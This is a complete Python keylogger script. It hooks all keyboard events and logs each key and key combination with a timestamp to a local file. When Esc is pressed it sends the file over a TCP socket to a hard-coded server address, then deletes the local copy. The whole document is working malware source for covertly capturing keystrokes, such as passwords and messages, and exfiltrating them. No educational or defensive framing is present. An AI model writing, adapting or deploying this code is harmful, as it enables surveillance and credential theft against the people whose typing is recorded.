import os
import keyboard
import socket
from time import strftime

log_file = "keylog.txt"
combination_keys = set()

SERVER_IP = "192.168.56.1"
PORT = 5001


def log_keys(event):
    global combination_keys
    timestamp = strftime("[%Y-%m-%d %H:%M:%S]")

    try:
        with open(log_file, "a") as f:
            if event.event_type == "down":
                combination_keys.add(event.name)

                if len(combination_keys) > 1:
                    f.write(f"\n{timestamp}: {' + '.join(combination_keys)}")
                else:
                    f.write(f"\n{timestamp}: {event.name}")

            elif event.event_type == "up":
                combination_keys.discard(event.name)

    except Exception as e:
        print(f"{timestamp}: Error: {e}")


def send_file():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_IP, PORT))
        print(f"[+] Connected to {SERVER_IP}:{PORT}")

        with open(log_file, "rb") as file:
            while chunk := file.read(1024):
                client_socket.send(chunk)

        print(f"[+] File '{log_file}' sent successfully!")


if __name__ == "__main__":
    keyboard.hook(log_keys)
    keyboard.wait("esc")
    send_file()
    os.remove(log_file)
